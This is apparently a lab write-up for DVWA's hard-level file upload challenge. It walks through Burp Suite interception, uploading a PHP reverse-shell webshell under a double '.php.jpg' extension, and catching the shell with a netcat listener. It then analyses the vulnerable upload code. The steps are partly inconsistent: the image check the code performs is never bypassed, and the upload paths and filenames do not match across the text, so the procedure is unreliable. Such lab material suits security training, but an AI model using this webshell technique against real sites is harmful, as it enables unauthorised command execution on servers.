# File Upload - Hard

---

## Attack Steps

1. Open Burp Suite

    - Start a **temporary project**

2. Navigate to the proxy tab
    - Shortcut `CTRL + SHIFT + P`

3. Ensure the intercept is OFF 
    - Open the chromium browser

4. Navigate to DVWA and set difficulty to hard 

    - http://<ip address>/dvwa
    - Login
    ```bash 
    admin
    password
    ```
    - Navigate to DVWA Security on the left menu 
    - Set security level to hard

5. Navigate to the target webpage 
    - http://<ip address>/dvwa/vulnerabilites/upload

6. Make a copy of `php_reverse_shell.php` and save as a jpg file:

    - `CTRL + ATL + T` to open a terminal 

    ```bash 
    sudo cp /usr/share/webshells/php/php_reverse_shell.php php_reverse_shell.jpg
    ```

7. Prepare for upload:
    
    - Return to target page
    - Browse for `php_reverse_shell.jpg`
    - Select file 
    - DO NOT UPLOAD 

8. Turn intercept on 

    - On Burp Suite turn the intercept on to catch request

9. Upload file:

    - Request will be caught by Burp

10. Edit request in Burp Proxy: 
    
    - Scroll down to filename
    - Change from
    ```bash 
    filename="php_reverse_shell.jpg"
    ```
    - to:
    ```bash 
    filename="php_reverse_shell.php.jpg"
    ```
    
11. Forward the request

    - Turn intercept off

12. On the kali terminal start a listener 

    ```bash 
    nc -lvnp 1234 # If you changed the port number in the webshell file then change it here 
    # l - listener mode
    # v - verbose output 
    # n - skip DNS resolution (faster) 
    # p <port number> - Listen on port number assigned # Change to your port number
    ```

13. Navigate to the uploaded webshell 

    - The uploaded file was saved to http://<ip address>/dvwa/hackable/upload/php-reverse-shell.php.jpg

    - Alternatively run `curl -s http://<ip address>/dvwa/hackable/upload/php-reverse-shell.php.jpg` in another terminal 

14. On the netcat listener look a connection
    
    - The should be output similar to the following 
    ```bash 
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    sh: no job control in this shell 
    sh-3.2$ 
    ```

    - We can now run commands on the DVWA machine

## Vulnerable Code Analysis


### File 
`/var/www/dvwa/vulnerabilities/upload/source/hard`

#### Key Vulnerability Points:

```php 
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
	$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

	// Is it an image?
	if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
		( $uploaded_size < 100000 ) &&
		getimagesize( $uploaded_tmp ) ) {

		// Can we move the file to the upload folder?
		if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}
		else {
			// Yes!
			$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
		}
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

?>
```

### Explanation

- The code takes the uploaded file directly from the user and constructs the target path for saving the file:

    ```php
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename($_FILES['uploaded']['name']);
    ```

- It extracts file information including the filename, file extension, size, and temporary file path:

    ```php
    $uploaded_name = $_FILES['uploaded']['name'];
    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name, '.') + 1);
    $uploaded_size = $_FILES['uploaded']['size'];
    $uploaded_tmp  = $_FILES['uploaded']['tmp_name'];
    ```

- The script validates the file by checking:

  - The file extension is one of `jpg`, `jpeg`, or `png` (case insensitive):

    ```php
    strtolower($uploaded_ext) == "jpg" || strtolower($uploaded_ext) == "jpeg" || strtolower($uploaded_ext) == "png"
    ```

  - The file size is less than 100,000 bytes.

  - The file is a valid image by using `getimagesize()` on the temporary file:

    ```php
    getimagesize($uploaded_tmp)
    ```

- If all validations pass, the file is moved to the upload directory:

    ```php
    move_uploaded_file($uploaded_tmp, $target_path)
    ```

- Success or failure messages are displayed based on whether the file was moved.

- If any validation fails, an error message is shown indicating only JPEG or PNG images are accepted.

### Causes:

- **Filename still not fully sanitised:** Using `basename()` only strips directory paths but doesn’t prevent dangerous filenames or double extensions (e.g., `shell.php.jpg`).

- **File saved with original name:** No renaming or randomisation, so potential overwriting and easier attacker targeting remain.

- **Upload directory is web accessible:** Uploaded files can still be accessed and potentially executed if a malicious file bypasses checks.

- **No checks against double extensions beyond extension extraction:** The script assumes the last extension is trustworthy.

